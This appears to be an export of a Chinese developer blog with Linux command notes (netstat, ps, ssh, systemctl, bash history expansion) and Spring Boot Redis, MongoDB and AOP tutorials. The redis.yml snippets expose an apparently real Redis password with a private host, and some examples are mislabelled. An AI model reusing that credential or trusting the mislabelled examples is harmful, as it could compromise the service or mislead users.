PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND944 root      20   0  565168  10532   7440 S   0.7  0.1   0:36.70 NetworkManagerPID    :进程idUSER   :进程所有者PR     :进程优先级NI     :nice值。负值表示高优先级，正值表示低优先级VIRT   :进程使用的虚拟内存总量，单位kb。VIRT=SWAP+RESRES    :进程使用的、未被换出的物理内存大小，单位kb。RES=CODE+DATASHR    :共享内存大小，单位kbS      :进程状态。D=不可中断的睡眠状态 R=运行 S=睡眠 T=跟踪/停止 Z=僵尸进程%CPU   :上次更新到现在的CPU时间占用百分比%MEM   :进程使用的物理内存百分比TIME+  :进程使用的CPU时间总计，单位1/100秒COMMAND:进程名称（命令名/命令行）



netstat：网络工具
netstat (network statistics) 是一个功能强大的网络工具，用于显示网络连接、路由表、接口统计等信息。虽然在新版 Linux 中逐渐被 ss 命令取代，但仍然是广泛使用的网络诊断工具。


语法
netstat [选项]


常用选项



分类
参数




显示网络连接
-c: 每隔一个固定时间，执行该netstat命令。-a: 显示所有连接（包括监听和非监听）-t: 显示 TCP 连接-u: 显示 UDP 连接-n: 以数字形式显示地址和端口（不解析主机名和服务名）-l: 仅显示监听状态的连接-p: 显示进程ID和程序名称（需要root权限）


显示路由表
-r：显示内核路由表-e：显示扩展信息


显示接口统计
-i:显示网络接口列表-s:显示各协议统计信息





范例
# 1. 显示所有网络连接netstat -ap# 2. 显示所有TCP连接netstat -atp# 3. 显示所有UDP连接netstat -aup# 4. 显示所有监听端口netstat -l# 5. 显示TCP监听端口(不解析主机名)netstat -ltnp# 6. 显示UDP监听端口(带进程信息)sudo netstat -lupn# 7. 显示路由表netstat -r # 等同于 route -n# 8. 显示网络接口统计netstat -i# 9. 显示各协议统计信息netstat -s# 10. 显示TCP连接及对应进程(需要root)sudo netstat -tulp# 11. 持续监控网络状态，每秒刷新一次netstat -c


输出字段解释
# Active Internet connections：有源TCP连接Proto: 协议类型(TCP/UDP)Recv-Q: 接收队列中的数据量Send-Q: 发送队列中的数据量Local Address: 本地地址和端口Foreign Address: 远程地址和端口State: 连接状态(仅TCP)    LISTEN: 监听状态    ESTABLISHED: 已建立连接    TIME_WAIT: 等待结束    CLOSE_WAIT: 远程已关闭，本地等待关闭    # Active UNIX domain sockets：有源Unix域套接口（和网络套接字一样，但是只能用于本机通信，性能可以提高一倍）Proto  :显示连接使用的协议RefCnt :表示连接到本套接口上的进程号Type   :显示套接口的类型State  :显示套接口当前的状态Path   :表示连接到套接口的其它进程使用的路径名。


！命令
! 符号在 Linux 中不但可以用作否定符号，还可以用来从历史命令记录中取出命令或不加修改的执行之前运行的命令。


空格敏感：! 与后续字符间通常不能有空格（! cmd 除外）
历史扩展：可通过关闭 set +o histexpand 禁用 ! 的历史扩展功能
安全风险：脚本中避免使用 !，可能意外触发历史命令




执行历史命令
!n：执行历史记录中第 n 条命令。如：!203   执行 history 列表中编号为 203 的命令
!!：重复执行上一条命令（相当于 !-1）
sudo !!： 用 sudo 重新运行上条命令
!-n：执行前第 n 条命令。如：!-3    执行当前命令往前数第 3 条命令
!关键字：执行==最近一条以 关键字开头==的命令。如：!curl  执行最近一次以 “curl” 开头的命令
!?关键字?：执行==最近一条任意位置包含 关键字==的命令。


组合其他修饰符
:p修饰符： 先预览命令而不直接执行。如：!!:p


引用历史命令的参数
!:n：引用上条命令的第 n 个参数（从 0 开始，0 是命令本身）
ls /etc /homeecho !:1  # 输出 "/etc"（上条命令的第1个参数）
!^：上条命令的第一个参数
cp file.txt /backup/ls !^    # 相当于 ls file.txt 
!$：上条命令的最后一个参数
tar -czf archive.tar.gz /path/to/dirrm !$    # 相当于 rm /path/to/dir
!*：上条命令的所有参数
mv dir1 dir2 dir3echo !*  # 输出 "dir1 dir2 dir3"##########################################################finsd -name "foo.zip" # 这里特意输错了find命令find !* # find -name "foo.zip"
!:-: 去掉上一条命令最后一个参数，再次执行
mv dir1 dir2 dir3echo !:-  # 输出 "dir1 dir2"


替换历史命令中的字符串
^old^new：替换上条命令中的==第一个== old 为 new 并执行
!!:gs/old/new: 将上一命令中的==所有==old替换为new
!scp:gs/old/new：将上一个scp命令中的==所有==old替换为new
cat /etc/host^host^hosts  # 相当于执行 cat /etc/hosts


条件执行
! cmd：如果 cmd 的退出状态码 ≠ 0（失败），则执行后续命令
root@TEST:/mnt/c/Users# ! ping -c1 test.com &amp;&amp; echo "Ping failed"PING test.com (3.18.255.247) 56(84) bytes of data.--- test.com ping statistics ---1 packets transmitted, 0 received, 100% packet loss, time 0msPing failedroot@TEST:/mnt/c/Users#


取反（逻辑非）
# 删除除了cfg结尾以外的所有文件rm !(*.cfg)


PS ：显示当前进程的状态

ps（英文全拼：process status）命令用于显示当前进程的状态，类似于 windows 的任务管理器命令的参数系统有些特殊。
ps命令支持三种不同风格的参数：UNIX 风格（单破折号）、BSD 风格（无破折号）和 GNU 风格（双破折号）。

ps [选项]


进程选择参数



参数
全称/含义
说明




-A
All
显示所有进程


-e
Every
等同于 -A


a
All with tty
显示所有终端关联的进程


-a
All except session leaders
显示除会话首进程外的所有进程


r
Running
仅显示运行中的进程


x
Include no tty
显示无终端控制的进程（如守护进程）


u
User-oriented
以用户为导向的格式显示


-u user
User
显示指定用户的进程


-p &lt;pid&gt;
Process ID
显示指定PID的进程


-C 命令名
Command
显示指定命令名的进程





输出格式控制



参数
全称/含义
说明




-f
Full
完整格式显示


-F
Extra full
扩展完整格式


l
Long
长格式显示


j
Jobs
作业格式显示


-j
Job control
显示作业控制信息


-H

显示进程层次结构（树状）


-o format
Output format
自定义输出格式


--sort spec
Sort by
按指定字段排序





显示线程



参数
说明




-L
显示线程（LWP和NLWP列）


-T
显示线程（SPID列）


-m
在进程后显示线程





常用选项组合
ps -ef | grep tomcat:  ==UNIX风格参数（单破折号）==  获取所有进程的完整信息，并查找特定进程
ps aux | grep tomcat: ==BSD风格参数（无破折号）==  获取所有进程的完整信息，并查找特定进程
ps aux --sort=-%mem | head: 按内存使用排序
ps -T -p &lt;PID&gt;：==显示进程的线程==
ps eww -p &lt;PID&gt;：==显示进程的环境变量==
ps -ejH : 显示进程树状结构
ps -eLf：显示线程信息


ssh：远程登陆

ssh (Secure Shell) 是用于安全远程登录和执行命令的协议和工具，提供加密的通信会话。

格式: ssh 用户名@机器名范例: ssh rd@build01
常用选项



选项
描述




-p &lt;端口&gt;
指定远程服务器端口（默认22）


-i &lt;密钥文件&gt;
指定身份认证私钥文件


-l &lt;用户名&gt;
指定登录用户名


-v
详细模式（可重复使用增加详细程度：-vv, -vvv）


-X
启用X11转发


-Y
启用可信X11转发


-L &lt;本地端口:目标主机:目标端口&gt;
本地端口转发


-R &lt;远程端口:目标主机:目标端口&gt;
远程端口转发


-D &lt;端口&gt;
动态端口转发（SOCKS代理）


-N
不执行远程命令（仅用于端口转发）


-f
后台运行


-C
压缩数据传输


-q
安静模式（抑制警告和诊断信息）



基本使用：
# 1. 基本登录ssh username@hostname# 2. 指定端口登录ssh -p 2222 username@hostname# 3. 使用密钥认证登录ssh -i ~/.ssh/id_rsa username@hostname# 4. 直接执行远程命令ssh username@hostname "ls -l /tmp"# 5. 调试连接ssh -vvv username@hostname
配置文件配置常用连接

~/.ssh/config 配置文件可以保存常用的SSH配置：
Host myserver    HostName server.example.com    User username    Port 2222    IdentityFile ~/.ssh/id_rsa    Compression yes
配置后可以简化为：
ssh myserver

密钥管理
# 创建目录mkdir -p /opt/ssh_test# 1. 生成密钥对ssh-keygen -t rsa -b 4096# 2. 复制公钥到服务器ssh-copy-id username@hostname# 3. 添加到ssh-agenteval "$(ssh-agent -s)" # 启动并设置环境变量ssh-add ~/.ssh/id_rsa  # 添加密钥# 4. 列出已加载密钥ssh-add -l# 5. 删除密钥ssh-add -d ~/.ssh/id_rsa  # 删除指定密钥ssh-add -D                # 删除所有密钥# 6. 关闭 ssh-agenteval "$(ssh-agent -k)"  # 正常关闭kill $SSH_AGENT_PID     # 强制终止
systemctl：系统服务
systemctl 是 systemd 系统和服务管理器的控制工具，用于管理 Linux 系统的服务、挂载点、套接字等单元(unit)。
systemctl [选项] [命令] [单元名称]



分类
命令




服务管理常用命令：启动/停止/重启服务
systemctl start &lt;服务名&gt;：启动服务systemctl stop &lt;服务名&gt;：停止服务systemctl restart &lt;服务名&gt;：重启服务systemctl reload &lt;服务名&gt;：重新加载配置(不重启)systemctl try-restart &lt;服务名&gt;：仅在服务运行时重启


服务管理常用命令：开机启用/禁用服务
systemctl enable &lt;服务名&gt;     ： 设置开机自启systemctl disable &lt;服务名&gt;    ： 取消开机自启systemctl reenable &lt;服务名&gt;   ： 重新设置开机自启systemctl is-enabled &lt;服务名&gt; ： 检查是否开机自启


服务管理常用命令：查看服务状态
systemctl status &lt;服务名&gt;           ： 查看服务详细状态systemctl is-active &lt;服务名&gt;        ： 检查服务是否运行systemctl list-units --type=service ： 列出所有服务单元`systemctl list-unit-files


系统管理命令：系统状态
systemctl status       ： 系统整体状态systemctl list-units   ： 显示所有活动单元systemctl list-sockets ： 显示所有套接字systemctl list-timers  ： 显示所有定时器


系统管理命令：系统控制
systemctl poweroff     ： 关机    systemctl reboot       ： 重启    systemctl suspend      ： 挂起    systemctl hibernate    ： 休眠    systemctl hybrid-sleep ： 混合休眠


日志管理
journalctl -u &lt;服务名&gt;          ： 查看指定服务的日志  journalctl -f -u &lt;服务名&gt;       ： 实时跟踪服务日志    journalctl --since "2023-01-01" ： 查看指定时间后的日志journalctl --disk-usage         ： 查看日志磁盘使用情况


用户服务管理(需要 --user 参数)
systemctl --user start &lt;服务名&gt;  ： 启动用户服务systemctl --user enable &lt;服务名&gt; ： 启用用户服务自启systemctl --user list-units      ： 列出用户单元







范例：
# 1. 查看 nginx 服务状态systemctl status nginx# 2. 设置 docker 开机自启并立即启动systemctl enable --now docker# 3. 查看所有失败的服务systemctl --failed# 4. 分析服务启动时间systemctl enable --now docker# 5. 分析服务启动时间systemd-analyze blame# 6. 临时修改服务配置(重启后失效):systemctl edit --full &lt;服务名&gt;


大多数管理命令需要 root 权限
修改单元文件后需要 daemon-reload
用户服务与系统服务是隔离的
不同发行版的 systemd 版本可能有差异


systemctl 是现代 Linux 系统管理的核心工具，熟练掌握可以高效管理系统服务。
openssl： 加密工具包
OpenSSL 是一个强大的开源加密工具包，提供了各种加密、证书管理和 SSL/TLS 功能。以下是 OpenSSL 的常用命令和用法。
openssl [命令] [选项] [参数]
举例：
# 生成密钥openssl rand -base64 32  # 生成 32 字节随机字符串
]]></content>
      <categories>
        <category>Linux</category>
        <category>基础命令</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>配置 序列化成JSON字符串.md</title>
    <url>/20221102/3fb18050.html</url>
    <content><![CDATA[当我们使用@Cacheable注解的时候会将返回的对象缓存起来，我们会发现默认缓存的值是二进制的，不方便查看，为此我们自定义序列化配置，改成JSON格式的
&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"    xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt;    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;    &lt;groupId&gt;com.cjs.example&lt;/groupId&gt;    &lt;artifactId&gt;cjs-springsecurity-example&lt;/artifactId&gt;    &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;    &lt;packaging&gt;jar&lt;/packaging&gt;    &lt;name&gt;cjs-springsecurity-example&lt;/name&gt;    &lt;description&gt;&lt;/description&gt;    &lt;parent&gt;        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;        &lt;version&gt;2.0.2.RELEASE&lt;/version&gt;        &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;    &lt;/parent&gt;    &lt;dependencies&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-starter-cache&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;        &lt;/dependency&gt;                &lt;dependency&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;            &lt;artifactId&gt;lombok&lt;/artifactId&gt;            &lt;optional&gt;true&lt;/optional&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;            &lt;scope&gt;test&lt;/scope&gt;        &lt;/dependency&gt;        &lt;dependency&gt;            &lt;groupId&gt;org.springframework.security&lt;/groupId&gt;            &lt;artifactId&gt;spring-security-test&lt;/artifactId&gt;            &lt;scope&gt;test&lt;/scope&gt;        &lt;/dependency&gt;    &lt;/dependencies&gt;    &lt;build&gt;        &lt;plugins&gt;            &lt;plugin&gt;                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;            &lt;/plugin&gt;        &lt;/plugins&gt;    &lt;/build&gt;&lt;/project&gt;
@Beanpublic RedisCacheManager redisCacheManager(RedisTemplate redisTemplate) {    RedisCacheWriter redisCacheWriter = RedisCacheWriter.nonLockingRedisCacheWriter(            redisTemplate.getConnectionFactory());    RedisCacheConfiguration redisCacheConfiguration = RedisCacheConfiguration.defaultCacheConfig()            .serializeValuesWith(                    RedisSerializationContext.SerializationPair.fromSerializer(redisTemplate.getValueSerializer()));    return new RedisCacheManager(redisCacheWriter, redisCacheConfiguration);}
]]></content>
      <categories>
        <category>数据库</category>
        <category>Spring</category>
        <category>Redis</category>
        <category>Spring Cache</category>
      </categories>
      <tags>
        <tag>Redis</tag>
        <tag>Spring Cache</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot集成MongoDB</title>
    <url>/20221031/eb573b79.html</url>
    <content><![CDATA[Spring Boot集成Mongodb在控制台输出nosql的日志
大家只需要在application.properties的配置文件下增加以下的配置就可以了
logging.level.org.springframework.data.mongodb.core = DEBUG
###############log4j 4 SQL Output start################# log4j.logger.com.dayainfo.ssp=DEBUG log4j.logger.com.springframework=DEBUG log4j.logger.com.ibatis=DEBUG log4j.logger.com.ibatis.common.jdbc.SimpleDataSource=DEBUG log4j.logger.com.ibatis.common.jdbc.ScriptRunner=DEBUG log4j.logger.com.ibatis.sqlmap.engine.impl.SqlMapClientDelegate=DEBUG log4j.logger.java.sql.Connection=DEBUG log4j.logger.java.sql.Statement=DEBUG log4j.logger.java.sql.PreparedStatement=DEBUG log4j.logger.java.sql.ResultSet=DEBUG log4j.logger.org.apache.ibatis.logging.commons.JakartaCommonsLoggingImpl=DEBUG log4j.logger.java.sql=DEBUG,CONSOLE log4j.appender.CONSOLE = org.apache.log4j.ConsoleAppender log4j.appender.CONSOLE.Target = System.out log4j.appender.CONSOLE.layout = org.apache.log4j.PatternLayout log4j.appender.CONSOLE.layout.ConversionPattern =%d{ABSOLUTE} %5p %c{1}\:%L - %m%n ###############log4j 4 SQL Output end###################
]]></content>
      <categories>
        <category>数据库</category>
        <category>Spring</category>
        <category>MongoDB</category>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
        <tag>Mongodb</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot集成Redis</title>
    <url>/20230302/f677ab49.html</url>
    <content><![CDATA[
Spring 通过模板方式（RedisTemplate）提供了对Redis的数据查询和操作功能。
可以参考 https://repo1.maven.org/maven2/org/springframework/boot/spring-boot-dependencies/2.6.6/spring-boot-dependencies-2.6.6.pom 查看版本依赖

基于RedisTemplate+Jedis的数据操作

Jedis是Redis的Java客户端，在SpringBoot 1.x版本中也是默认的客户端。在SpringBoot 2.x版本中默认客户端是Luttuce。

实现DEMO


POM.xml
引入spring-boot-starter-data-redis包，SpringBoot2中默认的客户端是Lettuce, 所以需要exclude掉lettuce-core包，并引入jedis的包。
 &lt;dependencies&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;        &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt;        &lt;version&gt;2.6.6&lt;/version&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;        &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;        &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;        &lt;version&gt;2.6.6&lt;/version&gt;        &lt;exclusions&gt;            &lt;exclusion&gt;                &lt;groupId&gt;io.lettuce&lt;/groupId&gt;                &lt;artifactId&gt;lettuce-core&lt;/artifactId&gt;            &lt;/exclusion&gt;        &lt;/exclusions&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;redis.clients&lt;/groupId&gt;        &lt;artifactId&gt;jedis&lt;/artifactId&gt;        &lt;version&gt;3.7.1&lt;/version&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;        &lt;artifactId&gt;commons-pool2&lt;/artifactId&gt;        &lt;version&gt;2.11.1&lt;/version&gt;    &lt;/dependency&gt;&lt;/dependencies&gt;


redis.yml 配置
 spring:   redis:    database: 0    host: 172.16.163.128    password: dHcphufFGcSaJLMK    port: 6380    timeout: 10000    jedis:      pool:        min-idle: 0        max-active: 8        max-idle: 8


RedisConfig配置
 import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.data.redis.connection.RedisConnectionFactory;import org.springframework.data.redis.core.RedisTemplate;import org.springframework.data.redis.serializer.GenericJackson2JsonRedisSerializer;import org.springframework.data.redis.serializer.StringRedisSerializer;@Configurationpublic class RedisConfig {    @Bean    public RedisTemplate&lt;String, Object&gt; redisTemplate(RedisConnectionFactory connectionFactory) {        RedisTemplate&lt;String, Object&gt; template = new RedisTemplate&lt;&gt;();        template.setConnectionFactory(connectionFactory);        template.setKeySerializer(new StringRedisSerializer());        template.setHashKeySerializer(new StringRedisSerializer());        template.setValueSerializer(new GenericJackson2JsonRedisSerializer());        template.setHashValueSerializer(new GenericJackson2JsonRedisSerializer());        template.afterPropertiesSet();        return template;    }}
注入JedisConnectionFactory：




测试Redis连接
 &lt;dependencies&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;        &lt;artifactId&gt;lombok&lt;/artifactId&gt;        &lt;version&gt;${lombok.version}&lt;/version&gt;        &lt;optional&gt;true&lt;/optional&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;        &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;        &lt;version&gt;${springboot.version}&lt;/version&gt;        &lt;scope&gt;test&lt;/scope&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;junit&lt;/groupId&gt;        &lt;artifactId&gt;junit&lt;/artifactId&gt;        &lt;version&gt;${junit.version}&lt;/version&gt;        &lt;scope&gt;test&lt;/scope&gt;    &lt;/dependency&gt;&lt;/dependencies&gt;
 import org.junit.Assert;import org.junit.Test;import org.junit.runner.RunWith;import org.springframework.boot.test.context.SpringBootTest;import org.springframework.data.redis.core.RedisTemplate;import org.springframework.test.context.ActiveProfiles;import org.springframework.test.context.TestPropertySource;import org.springframework.test.context.junit4.SpringRunner;import javax.annotation.Resource;@RunWith(SpringRunner.class)@SpringBootTest(classes = DatabaseApplication.class)@ActiveProfiles("dev")@TestPropertySource(        properties = {                "server.port=80",                "spring.application.name=configuration",                "spring.cloud.nacos.config.server-addr=native.virtual.com:8848",                "spring.cloud.nacos.config.file-extension=yml",                "spring.cloud.nacos.config.namespace=learn-dev",                "spring.cloud.nacos.config.group=DEFAULT_GROUP",                "spring.cloud.nacos.config.extension-configs[0].data-id=redis.yml",                "spring.cloud.nacos.config.extension-configs[0].refresh=true"        })public class DatabaseApplicationTests {    @Resource    private RedisTemplate redisTemplate;    @Test    public void testRedisConnection() {        redisTemplate.opsForList().leftPush("test", "111");        redisTemplate.opsForList().leftPush("test", "222");        redisTemplate.opsForList().leftPush("test", "333");        Assert.assertTrue("111".equals(redisTemplate.opsForList().rightPop("test")));        Assert.assertTrue(redisTemplate.delete("test"));    }}


基于RedisTemplate+Lettuce的数据操作
Lettuce 说明
Github（lettuce-core）
Lettuce 是一个可伸缩线程安全的 Redis 客户端。多个线程可以共享同一个 RedisConnection。它利用优秀 netty NIO 框架来高效地管理多个连接。
Lettuce 从一开始就按照非阻塞式 IO 进行设计，是一个纯异步客户端，对异步和反应式 API 的支持都很全面。即使是同步命令，底层的通信过程仍然是异步模型，只是通过阻塞调用线程来模拟出同步效果而已。

在SpringBoot 2.x版本中Redis默认客户端是Lettuce，本文主要介绍SpringBoot 和默认的Lettuce的整合案例

Lettuce 特性

支持 同步、异步、响应式 的方式
支持 Redis Sentinel
支持 Redis Cluster
支持 SSL 和 Unix Domain Socket 连接
支持 Streaming API
支持 CDI 和 Spring 的集成
支持 Command Interfaces
兼容 Java 8+ 以上版本

Lettuce  和 Jedis 对比官方说明

实现DEMO


POM.xml
引入spring-boot-starter-data-redis包，SpringBoot2中默认的客户端是Lettuce, 所以需要exclude掉lettuce-core包，并引入jedis的包。
 &lt;dependencies&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;        &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt;        &lt;version&gt;2.6.6&lt;/version&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;        &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;        &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;        &lt;version&gt;2.6.6&lt;/version&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;        &lt;artifactId&gt;commons-pool2&lt;/artifactId&gt;        &lt;version&gt;2.11.1&lt;/version&gt;    &lt;/dependency&gt;&lt;/dependencies&gt;


redis.yml 配置
 spring:   redis:    database: 0    host: 172.16.163.128    password: dHcphufFGcSaJLMK    port: 6380    timeout: 10000    lettuce:      pool:        max-active: 200        max-idle: 5        max-wait: -1        min-idle: 0        enabled: true


RedisConfig配置（代码和Jedis注入一样 ，只是装配的 connectionFactory  实现类不一样 ）
 import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.data.redis.connection.RedisConnectionFactory;import org.springframework.data.redis.core.RedisTemplate;import org.springframework.data.redis.serializer.GenericJackson2JsonRedisSerializer;import org.springframework.data.redis.serializer.StringRedisSerializer;@Configurationpublic class RedisConfig {    @Bean    public RedisTemplate&lt;String, Object&gt; redisTemplate(RedisConnectionFactory connectionFactory) {        RedisTemplate&lt;String, Object&gt; template = new RedisTemplate&lt;&gt;();        template.setConnectionFactory(connectionFactory);        template.setKeySerializer(new StringRedisSerializer());        template.setHashKeySerializer(new StringRedisSerializer());        template.setValueSerializer(new GenericJackson2JsonRedisSerializer());        template.setHashValueSerializer(new GenericJackson2JsonRedisSerializer());        template.afterPropertiesSet();        return template;    }}
注入JedisConnectionFactory：



测试Redis连接
 &lt;dependencies&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;        &lt;artifactId&gt;lombok&lt;/artifactId&gt;        &lt;version&gt;${lombok.version}&lt;/version&gt;        &lt;optional&gt;true&lt;/optional&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;        &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;        &lt;version&gt;${springboot.version}&lt;/version&gt;        &lt;scope&gt;test&lt;/scope&gt;    &lt;/dependency&gt;    &lt;dependency&gt;        &lt;groupId&gt;junit&lt;/groupId&gt;        &lt;artifactId&gt;junit&lt;/artifactId&gt;        &lt;version&gt;${junit.version}&lt;/version&gt;        &lt;scope&gt;test&lt;/scope&gt;    &lt;/dependency&gt;&lt;/dependencies&gt;
 import org.junit.Assert;import org.junit.Test;import org.junit.runner.RunWith;import org.springframework.boot.test.context.SpringBootTest;import org.springframework.data.redis.core.RedisTemplate;import org.springframework.test.context.ActiveProfiles;import org.springframework.test.context.TestPropertySource;import org.springframework.test.context.junit4.SpringRunner;import javax.annotation.Resource;@RunWith(SpringRunner.class)@SpringBootTest(classes = DatabaseApplication.class)@ActiveProfiles("dev")@TestPropertySource(        properties = {                "server.port=80",                "spring.application.name=configuration",                "spring.cloud.nacos.config.server-addr=native.virtual.com:8848",                "spring.cloud.nacos.config.file-extension=yml",                "spring.cloud.nacos.config.namespace=learn-dev",                "spring.cloud.nacos.config.group=DEFAULT_GROUP",                "spring.cloud.nacos.config.extension-configs[0].data-id=redis.yml",                "spring.cloud.nacos.config.extension-configs[0].refresh=true"        })public class DatabaseApplicationTests {    @Resource    private RedisTemplate redisTemplate;    @Test    public void testRedisConnection() {        redisTemplate.opsForList().leftPush("test", "111");        redisTemplate.opsForList().leftPush("test", "222");        redisTemplate.opsForList().leftPush("test", "333");        Assert.assertTrue("111".equals(redisTemplate.opsForList().rightPop("test")));        Assert.assertTrue(redisTemplate.delete("test"));    }}


基于RedisTemplate+Lettuce数据类封装
原文：https://pdai.tech/md/spring/springboot/springboot-x-redis-lettuce-wrap.html

RedisTemplate中的操作和方法众多，为了程序保持方法使用的一致性，屏蔽一些无关的方法以及对使用的方法进一步封装。



RedisService接口类
 import org.springframework.data.redis.core.RedisCallback;import java.util.Collection;import java.util.Set;public interface IRedisService&lt;T&gt; {    void set(String key, T value);    void set(String key, T value, long time);    T get(String key);    void delete(String key);    void delete(Collection&lt;String&gt; keys);    boolean expire(String key, long time);    Long getExpire(String key);    boolean hasKey(String key);    Long increment(String key, long delta);    Long decrement(String key, long delta);    void addSet(String key, T value);    Set&lt;T&gt; getSet(String key);    void deleteSet(String key, T value);    T execute(RedisCallback&lt;T&gt; redisCallback);}


RedisService的实现类
 import com.local.service.IRedisService;import org.springframework.data.redis.core.RedisCallback;import org.springframework.data.redis.core.RedisTemplate;import javax.annotation.Resource;import java.util.Collection;import java.util.Set;import java.util.concurrent.TimeUnit;public class RedisServiceImpl&lt;T&gt; implements IRedisService&lt;T&gt; {    @Resource(name = "redisTemplate")    private RedisTemplate&lt;String, T&gt; redisTemplate;    @Override    public void set(String key, T value, long time) {        redisTemplate.opsForValue().set(key, value, time, TimeUnit.SECONDS);    }    @Override    public void set(String key, T value) {        redisTemplate.opsForValue().set(key, value);    }    @Override    public T get(String key) {        return redisTemplate.opsForValue().get(key);    }    @Override    public void delete(String key) {        redisTemplate.delete(key);    }    @Override    public void delete(Collection&lt;String&gt; keys) {        redisTemplate.delete(keys);    }    @Override    public boolean expire(String key, long time) {        return redisTemplate.expire(key, time, TimeUnit.SECONDS);    }    @Override    public Long getExpire(String key) {        return redisTemplate.getExpire(key, TimeUnit.SECONDS);    }    @Override    public boolean hasKey(String key) {        return redisTemplate.hasKey(key);    }    @Override    public Long increment(String key, long delta) {        return redisTemplate.opsForValue().increment(key, delta);    }    @Override    public Long decrement(String key, long delta) {        return redisTemplate.opsForValue().decrement(key);    }    @Override    public void addSet(String key, T value) {        redisTemplate.opsForSet().add(key, value);    }    @Override    public Set&lt;T&gt; getSet(String key) {        return redisTemplate.opsForSet().members(key);    }    @Override    public void deleteSet(String key, T value) {        redisTemplate.opsForSet().remove(key, value);    }    @Override    public T execute(RedisCallback&lt;T&gt; redisCallback) {        return redisTemplate.execute(redisCallback);    }}


]]></content>
      <categories>
        <category>数据库</category>
        <category>Spring</category>
        <category>Redis</category>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
        <tag>Mongodb</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring基础-AOP</title>
    <url>/20230319/28678f43.html</url>
    <content><![CDATA[拦截器类型

@Before：这种拦截器先执行拦截代码，再执行目标代码。如果拦截器抛异常，那么目标代码就不执行了；
@After：这种拦截器先执行目标代码，再执行拦截器代码。无论目标代码是否抛异常，拦截器代码都会执行；
@AfterReturning：和@After不同的是，只有当目标代码正常返回时，才执行拦截器代码；
@AfterThrowing：和@After不同的是，只有当目标代码抛出了异常时，才执行拦截器代码；
@Around：能完全控制目标代码是否执行，并可以在执行前后、抛异常后执行任意拦截代码，可以说是包含了上面所有功能

使用注解装配AOP的DEMO


依赖引入
 &lt;dependency&gt;    &lt;groupId&gt;org.aspectj&lt;/groupId&gt;    &lt;artifactId&gt;aspectjweaver&lt;/artifactId&gt;    &lt;version&gt;1.9.19&lt;/version&gt;&lt;/dependency&gt;

spring-aop：AOP核心功能，例如代理工厂等
aspectjweaver：支持切入点表达式等
aspectjrt：支持aop相关注解等
aspectjweaver包含aspectjrt的内容，所以我们只需要引入aspectjweaver依赖包就可以了




定义一个性能监控的注解
